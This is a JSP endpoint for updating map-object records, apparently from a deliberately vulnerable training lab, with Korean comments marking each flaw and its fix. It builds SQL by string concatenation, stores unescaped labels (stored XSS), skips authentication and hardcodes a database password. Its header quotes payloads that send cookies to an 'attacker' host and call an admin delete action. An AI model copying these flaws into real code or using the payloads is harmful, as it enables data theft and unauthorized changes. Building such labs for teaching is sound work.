<%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.sql.*" %>
<%
    /**
     * updateUnit.jsp — 부대 정보 수정 API
     *
     * 사용법: POST updateUnit.jsp
     * 파라미터: id, label, position_lat, position_lng, color, status
     *
     * [취약점] VULN-C13-02: Stored XSS (CWE-79)
     * label 필드에 대한 입력 검증/이스케이프 없음
     * 저장된 XSS 페이로드가 map.jsp에서 그대로 렌더링됨
     * [올바른 구현] 입력값을 HTML 이스케이프 처리하고, PreparedStatement 사용
     *   String safeLabel = StringEscapeUtils.escapeHtml4(label);
     *   PreparedStatement pstmt = conn.prepareStatement("UPDATE map_objects SET label = ? WHERE id = ?");
     *
     * 공격 예시:
     *   label=<img src=x onerror="document.location='http://attacker/steal?c='+document.cookie">
     *   label=<script>fetch('/admin.jsp?action=delete&id=1')</script>
     *
     * [취약점] VULN-C13-03: 인증 부재 (CWE-306)
     * 수정 요청에 대한 인증/인가 확인 없음
     * [올바른 구현] 세션 기반 인증 확인 후 수정 허용
     */

    response.setContentType("application/json; charset=UTF-8");

    if (!"POST".equalsIgnoreCase(request.getMethod())) {
        out.print("{\"error\": \"POST 메서드만 허용\"}");
        return;
    }

    String id = request.getParameter("id");
    String label = request.getParameter("label");  // ★ 이스케이프 없이 저장
    String lat = request.getParameter("position_lat");
    String lng = request.getParameter("position_lng");
    String color = request.getParameter("color");
    String status = request.getParameter("status");

    if (id == null || id.isEmpty()) {
        out.print("{\"error\": \"id 파라미터 필요\"}");
        return;
    }

    String dbUrl = "jdbc:postgresql://localhost:5432/cop_db";
    String dbUser = "cop_user";
    String dbPass = "C0p!Map#2024";

    Connection conn = null;
    try {
        Class.forName("org.postgresql.Driver");
        conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);

        StringBuilder sql = new StringBuilder("UPDATE map_objects SET updated_at = NOW()");

        // [취약점] VULN-C13-02: label 필드 — 이스케이프/검증 없이 직접 SQL에 삽입 (SQLi + Stored XSS)
        // [올바른 구현] PreparedStatement + HTML 이스케이프
        if (label != null && !label.isEmpty()) {
            sql.append(", label = '").append(label).append("'");  // ★ SQLi + Stored XSS
        }
        if (lat != null && !lat.isEmpty()) {
            sql.append(", position_lat = ").append(lat);
        }
        if (lng != null && !lng.isEmpty()) {
            sql.append(", position_lng = ").append(lng);
        }
        if (color != null && !color.isEmpty()) {
            sql.append(", color = '").append(color).append("'");
        }
        if (status != null && !status.isEmpty()) {
            sql.append(", status = '").append(status).append("'");
        }

        sql.append(" WHERE id = ").append(id);

        Statement stmt = conn.createStatement();
        int affected = stmt.executeUpdate(sql.toString());
        stmt.close();

        if (affected > 0) {
            out.print("{\"success\": true, \"message\": \"수정 완료\", \"affected\": " + affected + "}");
        } else {
            out.print("{\"success\": false, \"message\": \"해당 ID 없음\"}");
        }

    } catch (Exception e) {
        out.print("{\"error\": \"" + e.getMessage().replace("\"", "\\\"") + "\"}");
    } finally {
        if (conn != null) try { conn.close(); } catch (SQLException e) {}
    }
%>
